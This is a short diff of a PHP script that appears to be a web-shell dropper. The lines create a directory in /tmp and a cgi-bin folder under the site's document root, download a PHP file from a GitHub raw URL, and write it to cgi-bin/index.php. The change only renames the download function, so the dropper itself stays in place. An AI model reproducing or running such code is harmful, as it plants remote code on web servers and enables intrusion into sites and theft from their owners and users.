@@ -28,7 +28,7 @@ if(file_exists('/tmp/6h6h6hfddgdf'.$d.$random)) { } else {
 	mkdir('/tmp/6h6h6hfddgdf'.$d.$random);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
-$rr = get_contents('https://raw.githubusercontent.com/HecSec/New/main/index.php');
+$rr = sexx('https://raw.githubusercontent.com/HecSec/New/main/index.php');
 $ss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/index.php" ; 
 if (file_put_contents ($ss, $rr));
 	
